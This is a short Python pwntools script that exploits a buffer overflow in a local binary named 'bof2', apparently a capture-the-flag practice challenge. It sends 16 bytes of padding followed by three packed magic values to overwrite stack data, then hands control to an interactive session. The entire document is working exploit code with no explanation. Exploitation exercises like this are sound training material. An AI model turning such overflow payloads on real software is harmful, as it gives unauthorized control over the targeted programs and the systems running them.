from pwn import *

p = process('./bof2')
exe = ELF('./bof2', checksec=False)

payload = b'a'*16 + p64(0xCAFEBABE) + p64(0xdeadbeef) + p64(0x13371337)

p.sendline(payload)
p.interactive()